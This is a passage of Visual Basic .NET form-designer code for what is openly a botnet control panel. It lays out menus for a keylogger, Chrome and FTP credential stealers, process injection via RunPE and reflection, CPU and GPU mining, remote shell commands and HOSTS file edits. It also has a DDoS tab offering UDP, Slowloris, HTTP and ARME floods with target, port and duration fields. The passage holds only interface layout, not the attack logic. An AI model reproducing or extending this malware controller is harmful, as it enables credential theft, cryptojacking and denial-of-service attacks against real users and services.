        'OpenHiddenToolStripMenuItem
        '
        Me.OpenHiddenToolStripMenuItem.Name = "OpenHiddenToolStripMenuItem"
        Me.OpenHiddenToolStripMenuItem.Size = New System.Drawing.Size(145, 22)
        Me.OpenHiddenToolStripMenuItem.Text = "Open Hidden"
        '
        'Keylogger
        '
        Me.Keylogger.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DownloadKeylogsToolStripMenuItem, Me.SearchKeylogsToolStripMenuItem, Me.DeleteKeylogsToolStripMenuItem})
        Me.Keylogger.Image = CType(resources.GetObject("Keylogger.Image"), System.Drawing.Image)
        Me.Keylogger.Name = "Keylogger"
        Me.Keylogger.Size = New System.Drawing.Size(155, 22)
        Me.Keylogger.Text = "Keylogger"
        '
        'DownloadKeylogsToolStripMenuItem
        '
        Me.DownloadKeylogsToolStripMenuItem.Name = "DownloadKeylogsToolStripMenuItem"
        Me.DownloadKeylogsToolStripMenuItem.Size = New System.Drawing.Size(172, 22)
        Me.DownloadKeylogsToolStripMenuItem.Text = "Download Keylogs"
        '
        'SearchKeylogsToolStripMenuItem
        '
        Me.SearchKeylogsToolStripMenuItem.Name = "SearchKeylogsToolStripMenuItem"
        Me.SearchKeylogsToolStripMenuItem.Size = New System.Drawing.Size(172, 22)
        Me.SearchKeylogsToolStripMenuItem.Text = "Search Keylogs"
        '
        'DeleteKeylogsToolStripMenuItem
        '
        Me.DeleteKeylogsToolStripMenuItem.Name = "DeleteKeylogsToolStripMenuItem"
        Me.DeleteKeylogsToolStripMenuItem.Size = New System.Drawing.Size(172, 22)
        Me.DeleteKeylogsToolStripMenuItem.Text = "Delete Keylogs"
        '
        'BotKiller
        '
        Me.BotKiller.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RunBotKillerToolStripMenuItem, Me.RunHardBotKillerToolStripMenuItem, Me.ToolStripSeparator9, Me.EnableProactiveBotKillerToolStripMenuItem, Me.DisableProactiveBotKillerToolStripMenuItem})
        Me.BotKiller.Image = CType(resources.GetObject("BotKiller.Image"), System.Drawing.Image)
        Me.BotKiller.Name = "BotKiller"
        Me.BotKiller.Size = New System.Drawing.Size(155, 22)
        Me.BotKiller.Text = "Bot Killer"
        '
        'RunBotKillerToolStripMenuItem
        '
        Me.RunBotKillerToolStripMenuItem.Name = "RunBotKillerToolStripMenuItem"
        Me.RunBotKillerToolStripMenuItem.Size = New System.Drawing.Size(214, 22)
        Me.RunBotKillerToolStripMenuItem.Text = "Run Bot Killer"
        '
        'RunHardBotKillerToolStripMenuItem
        '
        Me.RunHardBotKillerToolStripMenuItem.Name = "RunHardBotKillerToolStripMenuItem"
        Me.RunHardBotKillerToolStripMenuItem.Size = New System.Drawing.Size(214, 22)
        Me.RunHardBotKillerToolStripMenuItem.Text = "Run Hard Bot Killer"
        '
        'ToolStripSeparator9
        '
        Me.ToolStripSeparator9.Name = "ToolStripSeparator9"
        Me.ToolStripSeparator9.Size = New System.Drawing.Size(211, 6)
        '
        'EnableProactiveBotKillerToolStripMenuItem
        '
        Me.EnableProactiveBotKillerToolStripMenuItem.Name = "EnableProactiveBotKillerToolStripMenuItem"
        Me.EnableProactiveBotKillerToolStripMenuItem.Size = New System.Drawing.Size(214, 22)
        Me.EnableProactiveBotKillerToolStripMenuItem.Text = "Enable Proactive Bot Killer"
        '
        'DisableProactiveBotKillerToolStripMenuItem
        '
        Me.DisableProactiveBotKillerToolStripMenuItem.Name = "DisableProactiveBotKillerToolStripMenuItem"
        Me.DisableProactiveBotKillerToolStripMenuItem.Size = New System.Drawing.Size(214, 22)
        Me.DisableProactiveBotKillerToolStripMenuItem.Text = "Disable Proactive Bot Killer"
        '
        'Stealer
        '
        Me.Stealer.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ChromeStealerToolStripMenuItem, Me.FTPStealerToolStripMenuItem})
        Me.Stealer.Image = CType(resources.GetObject("Stealer.Image"), System.Drawing.Image)
        Me.Stealer.Name = "Stealer"
        Me.Stealer.Size = New System.Drawing.Size(155, 22)
        Me.Stealer.Text = "Stealers"
        '
        'ChromeStealerToolStripMenuItem
        '
        Me.ChromeStealerToolStripMenuItem.Name = "ChromeStealerToolStripMenuItem"
        Me.ChromeStealerToolStripMenuItem.Size = New System.Drawing.Size(155, 22)
        Me.ChromeStealerToolStripMenuItem.Text = "Chrome Stealer"
        '
        'FTPStealerToolStripMenuItem
        '
        Me.FTPStealerToolStripMenuItem.Name = "FTPStealerToolStripMenuItem"
        Me.FTPStealerToolStripMenuItem.Size = New System.Drawing.Size(155, 22)
        Me.FTPStealerToolStripMenuItem.Text = "FTP Stealer"
        '
        'ToolStripSeparator1
        '
        Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
        Me.ToolStripSeparator1.Size = New System.Drawing.Size(152, 6)
        '
        'BotInfo
        '
        Me.BotInfo.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripMenuItem1, Me.StopToolStripMenuItem, Me.AVInfoToolStripMenuItem})
        Me.BotInfo.Image = CType(resources.GetObject("BotInfo.Image"), System.Drawing.Image)
        Me.BotInfo.Name = "BotInfo"
        Me.BotInfo.Size = New System.Drawing.Size(155, 22)
        Me.BotInfo.Text = "Bot Info"
        '
        'ToolStripMenuItem1
        '
        Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
        Me.ToolStripMenuItem1.Size = New System.Drawing.Size(165, 22)
        Me.ToolStripMenuItem1.Text = "General Info"
        '
        'StopToolStripMenuItem
        '
        Me.StopToolStripMenuItem.Name = "StopToolStripMenuItem"
        Me.StopToolStripMenuItem.Size = New System.Drawing.Size(165, 22)
        Me.StopToolStripMenuItem.Text = "PC Specifications"
        '
        'AVInfoToolStripMenuItem
        '
        Me.AVInfoToolStripMenuItem.Name = "AVInfoToolStripMenuItem"
        Me.AVInfoToolStripMenuItem.Size = New System.Drawing.Size(165, 22)
        Me.AVInfoToolStripMenuItem.Text = "AV Info"
        '
        'AdvancedInfo
        '
        Me.AdvancedInfo.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.SeedTorrentToolStripMenuItem, Me.StartToolStripMenuItem1, Me.StopToolStripMenuItem2, Me.ToolStripSeparator7, Me.InjectFileRunPEToolStripMenuItem, Me.InjectFileReflectionToolStripMenuItem, Me.ToolStripSeparator8, Me.ToolStripMenuItem15, Me.StopMiningToolStripMenuItem, Me.ToolStripSeparator10, Me.ToolStripMenuItem16})
        Me.AdvancedInfo.Image = CType(resources.GetObject("AdvancedInfo.Image"), System.Drawing.Image)
        Me.AdvancedInfo.Name = "AdvancedInfo"
        Me.AdvancedInfo.Size = New System.Drawing.Size(155, 22)
        Me.AdvancedInfo.Text = "Advanced"
        '
        'SeedTorrentToolStripMenuItem
        '
        Me.SeedTorrentToolStripMenuItem.Name = "SeedTorrentToolStripMenuItem"
        Me.SeedTorrentToolStripMenuItem.Size = New System.Drawing.Size(188, 22)
        Me.SeedTorrentToolStripMenuItem.Text = "Seed Torrent"
        '
        'StartToolStripMenuItem1
        '
        Me.StartToolStripMenuItem1.Name = "StartToolStripMenuItem1"
        Me.StartToolStripMenuItem1.Size = New System.Drawing.Size(188, 22)
        Me.StartToolStripMenuItem1.Text = "Shell Command"
        '
        'StopToolStripMenuItem2
        '
        Me.StopToolStripMenuItem2.Name = "StopToolStripMenuItem2"
        Me.StopToolStripMenuItem2.Size = New System.Drawing.Size(188, 22)
        Me.StopToolStripMenuItem2.Text = "Edit HOSTS File"
        '
        'ToolStripSeparator7
        '
        Me.ToolStripSeparator7.Name = "ToolStripSeparator7"
        Me.ToolStripSeparator7.Size = New System.Drawing.Size(185, 6)
        '
        'InjectFileRunPEToolStripMenuItem
        '
        Me.InjectFileRunPEToolStripMenuItem.Name = "InjectFileRunPEToolStripMenuItem"
        Me.InjectFileRunPEToolStripMenuItem.Size = New System.Drawing.Size(188, 22)
        Me.InjectFileRunPEToolStripMenuItem.Text = "Inject File (RunPE)"
        '
        'InjectFileReflectionToolStripMenuItem
        '
        Me.InjectFileReflectionToolStripMenuItem.Name = "InjectFileReflectionToolStripMenuItem"
        Me.InjectFileReflectionToolStripMenuItem.Size = New System.Drawing.Size(188, 22)
        Me.InjectFileReflectionToolStripMenuItem.Text = "Inject File (Reflection)"
        '
        'ToolStripSeparator8
        '
        Me.ToolStripSeparator8.Name = "ToolStripSeparator8"
        Me.ToolStripSeparator8.Size = New System.Drawing.Size(185, 6)
        '
        'ToolStripMenuItem15
        '
        Me.ToolStripMenuItem15.Name = "ToolStripMenuItem15"
        Me.ToolStripMenuItem15.Size = New System.Drawing.Size(188, 22)
        Me.ToolStripMenuItem15.Text = "Start CPU Mining"
        '
        'StopMiningToolStripMenuItem
        '
        Me.StopMiningToolStripMenuItem.Name = "StopMiningToolStripMenuItem"
        Me.StopMiningToolStripMenuItem.Size = New System.Drawing.Size(188, 22)
        Me.StopMiningToolStripMenuItem.Text = "Start GPU Mining"
        '
        'ToolStripSeparator10
        '
        Me.ToolStripSeparator10.Name = "ToolStripSeparator10"
        Me.ToolStripSeparator10.Size = New System.Drawing.Size(185, 6)
        '
        'ToolStripMenuItem16
        '
        Me.ToolStripMenuItem16.Name = "ToolStripMenuItem16"
        Me.ToolStripMenuItem16.Size = New System.Drawing.Size(188, 22)
        Me.ToolStripMenuItem16.Text = "Reconnect"
        '
        'MuteBoats
        '
        Me.MuteBoats.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.EnableMuteToolStripMenuItem, Me.DisableMuteToolStripMenuItem})
        Me.MuteBoats.Image = CType(resources.GetObject("MuteBoats.Image"), System.Drawing.Image)
        Me.MuteBoats.Name = "MuteBoats"
        Me.MuteBoats.Size = New System.Drawing.Size(155, 22)
        Me.MuteBoats.Text = "Mute"
        '
        'EnableMuteToolStripMenuItem
        '
        Me.EnableMuteToolStripMenuItem.Name = "EnableMuteToolStripMenuItem"
        Me.EnableMuteToolStripMenuItem.Size = New System.Drawing.Size(143, 22)
        Me.EnableMuteToolStripMenuItem.Text = "Enable Mute"
        '
        'DisableMuteToolStripMenuItem
        '
        Me.DisableMuteToolStripMenuItem.Name = "DisableMuteToolStripMenuItem"
        Me.DisableMuteToolStripMenuItem.Size = New System.Drawing.Size(143, 22)
        Me.DisableMuteToolStripMenuItem.Text = "Disable Mute"
        '
        'ToolStripSeparator3
        '
        Me.ToolStripSeparator3.Name = "ToolStripSeparator3"
        Me.ToolStripSeparator3.Size = New System.Drawing.Size(152, 6)
        '
        'ToolStripMenuItem2
        '
        Me.ToolStripMenuItem2.Image = CType(resources.GetObject("ToolStripMenuItem2.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem2.Name = "ToolStripMenuItem2"
        Me.ToolStripMenuItem2.Size = New System.Drawing.Size(155, 22)
        Me.ToolStripMenuItem2.Text = "Select All Bots"
        '
        'ToolStripMenuItem3
        '
        Me.ToolStripMenuItem3.Image = CType(resources.GetObject("ToolStripMenuItem3.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem3.Name = "ToolStripMenuItem3"
        Me.ToolStripMenuItem3.Size = New System.Drawing.Size(155, 22)
        Me.ToolStripMenuItem3.Text = "Select # of Bots"
        '
        'TabPage2
        '
        Me.TabPage2.Controls.Add(Me.TreeView2)
        Me.TabPage2.Controls.Add(Me.GroupBox4)
        Me.TabPage2.Controls.Add(Me.GroupBox3)
        Me.TabPage2.Controls.Add(Me.Button2)
        Me.TabPage2.Controls.Add(Me.Button1)
        Me.TabPage2.Controls.Add(Me.GroupBox2)
        Me.TabPage2.Controls.Add(Me.GroupBox1)
        Me.TabPage2.ImageIndex = 78
        Me.TabPage2.Location = New System.Drawing.Point(4, 23)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(637, 300)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Commands"
        Me.TabPage2.UseVisualStyleBackColor = True
        '
        'TreeView2
        '
        Me.TreeView2.Location = New System.Drawing.Point(6, 6)
        Me.TreeView2.Name = "TreeView2"
        TreeNode97.Name = "Node1"
        TreeNode97.Text = "Execute File"
        TreeNode98.Name = "Node4"
        TreeNode98.Text = "Update File"
        TreeNode99.Name = "Node5"
        TreeNode99.Text = "Uninstall"
        TreeNode100.Name = "Node0"
        TreeNode100.Text = "General"
        TreeNode101.Name = "Node6"
        TreeNode101.Text = "Open Visible"
        TreeNode102.Name = "Node7"
        TreeNode102.Text = "Open Hidden"
        TreeNode103.Name = "Node3"
        TreeNode103.Text = "Website Visitor"
        TreeNode104.Name = "Node10"
        TreeNode104.Text = "Run Bot Killer"
        TreeNode105.Name = "Node2"
        TreeNode105.Text = "Run Hard BK"
        TreeNode106.Name = "Node11"
        TreeNode106.Text = "Enable BK"
        TreeNode107.Name = "Node12"
        TreeNode107.Text = "Disable BK"
        TreeNode108.Name = "Node9"
        TreeNode108.Text = "Bot Killer"
        TreeNode109.Name = "Node2"
        TreeNode109.Text = "Download Logs"
        TreeNode110.Name = "Node3"
        TreeNode110.Text = "Search Logs"
        TreeNode111.Name = "Node4"
        TreeNode111.Text = "Delete Logs"
        TreeNode112.Name = "Node1"
        TreeNode112.Text = "Keylogger"
        TreeNode113.Name = "Node21"
        TreeNode113.Text = "Chrome Stealer"
        TreeNode114.Name = "Node22"
        TreeNode114.Text = "FTP Stealer"
        TreeNode115.Name = "Node13"
        TreeNode115.Text = "Stealers"
        TreeNode116.Name = "Node15"
        TreeNode116.Text = "General Info"
        TreeNode117.Name = "Node16"
        TreeNode117.Text = "PC Specifications"
        TreeNode118.Name = "Node0"
        TreeNode118.Text = "AV Info"
        TreeNode119.Name = "Node14"
        TreeNode119.Text = "Bot Info"
        TreeNode120.Name = "Node0"
        TreeNode120.Text = "Seed Torrent"
        TreeNode121.Name = "Node19"
        TreeNode121.Text = "Shell Command"
        TreeNode122.Name = "Node20"
        TreeNode122.Text = "Edit HOSTS File"
        TreeNode123.Name = "Node4"
        TreeNode123.Text = "Inject via RunPE"
        TreeNode124.Name = "Node5"
        TreeNode124.Text = "Inject via Reflection"
        TreeNode125.Name = "Node18"
        TreeNode125.Text = "Advanced"
        TreeNode126.Name = "Node2"
        TreeNode126.Text = "Enable Mute"
        TreeNode127.Name = "Node3"
        TreeNode127.Text = "Disable Mute"
        TreeNode128.Name = "Node1"
        TreeNode128.Text = "Mute Bots"
        Me.TreeView2.Nodes.AddRange(New System.Windows.Forms.TreeNode() {TreeNode100, TreeNode103, TreeNode108, TreeNode112, TreeNode115, TreeNode119, TreeNode125, TreeNode128})
        Me.TreeView2.Size = New System.Drawing.Size(151, 288)
        Me.TreeView2.TabIndex = 7
        '
        'GroupBox4
        '
        Me.GroupBox4.Controls.Add(Me.info)
        Me.GroupBox4.Controls.Add(Me.use)
        Me.GroupBox4.Controls.Add(Me.ListView3)
        Me.GroupBox4.Controls.Add(Me.Description)
        Me.GroupBox4.Location = New System.Drawing.Point(277, 106)
        Me.GroupBox4.Name = "GroupBox4"
        Me.GroupBox4.Size = New System.Drawing.Size(349, 94)
        Me.GroupBox4.TabIndex = 5
        Me.GroupBox4.TabStop = False
        Me.GroupBox4.Text = "DDoS Attack Information"
        '
        'info
        '
        Me.info.AutoSize = True
        Me.info.Location = New System.Drawing.Point(11, 54)
        Me.info.Name = "info"
        Me.info.Size = New System.Drawing.Size(253, 13)
        Me.info.TabIndex = 5
        Me.info.Text = "Info: Only put in IP in target. Suggested two threads."
        '
        'use
        '
        Me.use.AutoSize = True
        Me.use.Location = New System.Drawing.Point(11, 35)
        Me.use.Name = "use"
        Me.use.Size = New System.Drawing.Size(227, 13)
        Me.use.TabIndex = 4
        Me.use.Text = "Use: Home Connections, any typical Server/IP"
        '
        'ListView3
        '
        Me.ListView3.BackColor = System.Drawing.Color.White
        Me.ListView3.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader2})
        Me.ListView3.ForeColor = System.Drawing.Color.White
        Me.ListView3.GridLines = True
        Me.ListView3.Location = New System.Drawing.Point(200, 162)
        Me.ListView3.Name = "ListView3"
        Me.ListView3.Size = New System.Drawing.Size(302, 91)
        Me.ListView3.TabIndex = 3
        Me.ListView3.UseCompatibleStateImageBehavior = False
        Me.ListView3.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Text = "IP"
        Me.ColumnHeader2.Width = 112
        '
        'Description
        '
        Me.Description.AutoSize = True
        Me.Description.Location = New System.Drawing.Point(11, 16)
        Me.Description.Name = "Description"
        Me.Description.Size = New System.Drawing.Size(164, 13)
        Me.Description.TabIndex = 3
        Me.Description.Text = "Description: Standard UDP Flood"
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.Button3)
        Me.GroupBox3.Controls.Add(Me.TextBox5)
        Me.GroupBox3.Controls.Add(Me.Label2)
        Me.GroupBox3.Location = New System.Drawing.Point(277, 206)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(349, 53)
        Me.GroupBox3.TabIndex = 4
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Hostname Resolver"
        '
        'Button3
        '
        Me.Button3.Image = CType(resources.GetObject("Button3.Image"), System.Drawing.Image)
        Me.Button3.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.Button3.Location = New System.Drawing.Point(194, 12)
        Me.Button3.Name = "Button3"
        Me.Button3.Size = New System.Drawing.Size(149, 23)
        Me.Button3.TabIndex = 5
        Me.Button3.Text = "Resolve IP"
        Me.Button3.UseVisualStyleBackColor = True
        '
        'TextBox5
        '
        Me.TextBox5.Location = New System.Drawing.Point(34, 13)
        Me.TextBox5.Name = "TextBox5"
        Me.TextBox5.Size = New System.Drawing.Size(154, 20)
        Me.TextBox5.TabIndex = 7
        Me.TextBox5.Text = "www.google.com"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(6, 16)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(28, 13)
        Me.Label2.TabIndex = 6
        Me.Label2.Text = "Site:"
        '
        'Button2
        '
        Me.Button2.Image = CType(resources.GetObject("Button2.Image"), System.Drawing.Image)
        Me.Button2.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.Button2.Location = New System.Drawing.Point(393, 271)
        Me.Button2.Name = "Button2"
        Me.Button2.Size = New System.Drawing.Size(233, 23)
        Me.Button2.TabIndex = 3
        Me.Button2.Text = "Start Attack"
        Me.Button2.UseVisualStyleBackColor = True
        '
        'Button1
        '
        Me.Button1.Image = CType(resources.GetObject("Button1.Image"), System.Drawing.Image)
        Me.Button1.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.Button1.Location = New System.Drawing.Point(160, 271)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(227, 23)
        Me.Button1.TabIndex = 2
        Me.Button1.Text = "Stop Attack"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.data)
        Me.GroupBox2.Controls.Add(Me.Label9)
        Me.GroupBox2.Controls.Add(Me.ListView2)
        Me.GroupBox2.Controls.Add(Me.threads)
        Me.GroupBox2.Controls.Add(Me.Label7)
        Me.GroupBox2.Controls.Add(Me.time)
        Me.GroupBox2.Controls.Add(Me.Label6)
        Me.GroupBox2.Controls.Add(Me.port)
        Me.GroupBox2.Controls.Add(Me.Label4)
        Me.GroupBox2.Controls.Add(Me.target)
        Me.GroupBox2.Controls.Add(Me.Label5)
        Me.GroupBox2.Location = New System.Drawing.Point(277, 6)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(349, 94)
        Me.GroupBox2.TabIndex = 1
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "DDoS Main Options"
        '
        'data
        '
        Me.data.Location = New System.Drawing.Point(231, 62)
        Me.data.Name = "data"
        Me.data.Size = New System.Drawing.Size(112, 20)
        Me.data.TabIndex = 12
        Me.data.Text = "For POST HTTP"
        Me.ToolTip1.SetToolTip(Me.data, "Data the bot POSTS during HTTP POST attacks.")
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.Location = New System.Drawing.Point(142, 67)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(33, 13)
        Me.Label9.TabIndex = 11
        Me.Label9.Text = "Data:"
        '
        'ListView2
        '
        Me.ListView2.BackColor = System.Drawing.Color.White
        Me.ListView2.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1})
        Me.ListView2.ForeColor = System.Drawing.Color.White
        Me.ListView2.GridLines = True
        Me.ListView2.Location = New System.Drawing.Point(200, 162)
        Me.ListView2.Name = "ListView2"
        Me.ListView2.Size = New System.Drawing.Size(302, 91)
        Me.ListView2.TabIndex = 3
        Me.ListView2.UseCompatibleStateImageBehavior = False
        Me.ListView2.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "IP"
        Me.ColumnHeader1.Width = 112
        '
        'threads
        '
        Me.threads.Location = New System.Drawing.Point(74, 62)
        Me.threads.Name = "threads"
        Me.threads.Size = New System.Drawing.Size(62, 20)
        Me.threads.TabIndex = 10
        Me.threads.Text = "2"
        Me.ToolTip1.SetToolTip(Me.threads, "Threads to use for the attack. Default is the suggested amount.")
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Location = New System.Drawing.Point(6, 67)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(49, 13)
        Me.Label7.TabIndex = 9
        Me.Label7.Text = "Threads:"
        '
        'time
        '
        Me.time.Location = New System.Drawing.Point(231, 39)
        Me.time.Name = "time"
        Me.time.Size = New System.Drawing.Size(112, 20)
        Me.time.TabIndex = 8
        Me.time.Text = "300"
        Me.ToolTip1.SetToolTip(Me.time, "Time (in seconds) for the attack to last. You can always abort attacks early.")
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Location = New System.Drawing.Point(141, 42)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(84, 13)
        Me.Label6.TabIndex = 7
        Me.Label6.Text = "Time (Seconds):"
        '
        'port
        '
        Me.port.Location = New System.Drawing.Point(73, 39)
        Me.port.Name = "port"
        Me.port.Size = New System.Drawing.Size(62, 20)
        Me.port.TabIndex = 6
        Me.port.Text = "80"
        Me.ToolTip1.SetToolTip(Me.port, "For UDP and Condis. Port bot floods on the target.")
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(6, 42)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(29, 13)
        Me.Label4.TabIndex = 5
        Me.Label4.Text = "Port:"
        '
        'target
        '
        Me.target.Location = New System.Drawing.Point(73, 13)
        Me.target.Name = "target"
        Me.target.Size = New System.Drawing.Size(270, 20)
        Me.target.TabIndex = 4
        Me.ToolTip1.SetToolTip(Me.target, "Target to attack")
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(6, 16)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(41, 13)
        Me.Label5.TabIndex = 3
        Me.Label5.Text = "Target:"
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.SelectedOnly)
        Me.GroupBox1.Controls.Add(Me.bwflood)
        Me.GroupBox1.Controls.Add(Me.httppost)
        Me.GroupBox1.Controls.Add(Me.Label8)
        Me.GroupBox1.Controls.Add(Me.condis)
        Me.GroupBox1.Controls.Add(Me.Label3)
        Me.GroupBox1.Controls.Add(Me.arme)
        Me.GroupBox1.Controls.Add(Me.slowloris)
        Me.GroupBox1.Controls.Add(Me.httpget)
        Me.GroupBox1.Controls.Add(Me.UDP)
        Me.GroupBox1.Location = New System.Drawing.Point(166, 6)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(105, 253)
        Me.GroupBox1.TabIndex = 0
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "DDoS Method"
        '
        'SelectedOnly
        '
        Me.SelectedOnly.AutoSize = True
        Me.SelectedOnly.Location = New System.Drawing.Point(10, 19)
        Me.SelectedOnly.Name = "SelectedOnly"
        Me.SelectedOnly.Size = New System.Drawing.Size(92, 17)
        Me.SelectedOnly.TabIndex = 9
        Me.SelectedOnly.Text = "Selected Only"
        Me.ToolTip1.SetToolTip(Me.SelectedOnly, "Sends the DDoS command to your selected bots, instead of all of them.")
        Me.SelectedOnly.UseVisualStyleBackColor = True
        '
        'bwflood
        '
        Me.bwflood.AutoSize = True
        Me.bwflood.Location = New System.Drawing.Point(10, 224)
        Me.bwflood.Name = "bwflood"
        Me.bwflood.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.bwflood.Size = New System.Drawing.Size(72, 17)
        Me.bwflood.TabIndex = 15
        Me.bwflood.Text = "BW Flood"
        Me.ToolTip1.SetToolTip(Me.bwflood, "Mass downloads a file to consume bandwidth.")
        Me.bwflood.UseVisualStyleBackColor = True
        '
        'httppost
        '
        Me.httppost.AutoSize = True
        Me.httppost.Location = New System.Drawing.Point(10, 155)
        Me.httppost.Name = "httppost"
        Me.httppost.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.httppost.Size = New System.Drawing.Size(86, 17)
        Me.httppost.TabIndex = 14
        Me.httppost.Text = "HTTP POST"
        Me.ToolTip1.SetToolTip(Me.httppost, "HTTP POST Flood for websites. Custom data to POST.")
        Me.httppost.UseVisualStyleBackColor = True
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Location = New System.Drawing.Point(6, 116)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(45, 13)
        Me.Label8.TabIndex = 13
        Me.Label8.Text = "Layer 7:"
        '
        'condis
        '
        Me.condis.AutoSize = True
        Me.condis.Location = New System.Drawing.Point(14, 86)
        Me.condis.Name = "condis"
        Me.condis.Size = New System.Drawing.Size(57, 17)
        Me.condis.TabIndex = 12
        Me.condis.Text = "Condis"
        Me.ToolTip1.SetToolTip(Me.condis, "Rapid Connect/Disconnect Flood for game servers, TeamSpeak servers, etc")
        Me.condis.UseVisualStyleBackColor = True
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(6, 46)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(45, 13)
        Me.Label3.TabIndex = 11
        Me.Label3.Text = "Layer 4:"
        '
        'arme
        '
        Me.arme.AutoSize = True
        Me.arme.Location = New System.Drawing.Point(10, 201)
        Me.arme.Name = "arme"
        Me.arme.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.arme.Size = New System.Drawing.Size(56, 17)
        Me.arme.TabIndex = 7
        Me.arme.Text = "ARME"
        Me.ToolTip1.SetToolTip(Me.arme, "Apache Remote Memory Exhaustion Flood")
        Me.arme.UseVisualStyleBackColor = True
        '
        'slowloris
        '
        Me.slowloris.AutoSize = True
        Me.slowloris.Location = New System.Drawing.Point(10, 178)
        Me.slowloris.Name = "slowloris"
        Me.slowloris.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.slowloris.Size = New System.Drawing.Size(66, 17)
        Me.slowloris.TabIndex = 6
        Me.slowloris.Text = "Slowloris"
        Me.ToolTip1.SetToolTip(Me.slowloris, "Opens as many connections to the website as possible.")
        Me.slowloris.UseVisualStyleBackColor = True
        '
        'httpget
        '
        Me.httpget.AutoSize = True
        Me.httpget.Location = New System.Drawing.Point(10, 132)
        Me.httpget.Name = "httpget"
        Me.httpget.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.httpget.Size = New System.Drawing.Size(79, 17)
        Me.httpget.TabIndex = 5
        Me.httpget.Text = "HTTP GET"
        Me.ToolTip1.SetToolTip(Me.httpget, "Rapid HTTP GET Flood for Websites")
        Me.httpget.UseVisualStyleBackColor = True
        '
        'UDP
        '
        Me.UDP.AutoSize = True
        Me.UDP.Checked = True
        Me.UDP.Location = New System.Drawing.Point(14, 63)
        Me.UDP.Name = "UDP"
        Me.UDP.Size = New System.Drawing.Size(48, 17)
        Me.UDP.TabIndex = 1
        Me.UDP.TabStop = True
        Me.UDP.Text = "UDP"
        Me.ToolTip1.SetToolTip(Me.UDP, "Standard UDP Flood for home Connections, game servers, etc")
        Me.UDP.UseVisualStyleBackColor = True
        '
        'TabPage4
        '
        Me.TabPage4.Controls.Add(Me.LogView)
        Me.TabPage4.ImageIndex = 15
        Me.TabPage4.Location = New System.Drawing.Point(4, 23)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Size = New System.Drawing.Size(637, 300)
        Me.TabPage4.TabIndex = 3
        Me.TabPage4.Text = "Bot Logs"
        Me.TabPage4.UseVisualStyleBackColor = True
        '
        'BotLogsRightClick
        '
        Me.BotLogsRightClick.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripMenuItem5, Me.ToolStripMenuItem6})
        Me.BotLogsRightClick.Name = "ContextMenuStrip1"
        Me.BotLogsRightClick.Size = New System.Drawing.Size(148, 48)
        '
        'ToolStripMenuItem5
        '
        Me.ToolStripMenuItem5.Image = CType(resources.GetObject("ToolStripMenuItem5.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem5.Name = "ToolStripMenuItem5"
        Me.ToolStripMenuItem5.Size = New System.Drawing.Size(147, 22)
        Me.ToolStripMenuItem5.Text = "Copy All Logs"
        '
        'ToolStripMenuItem6
        '
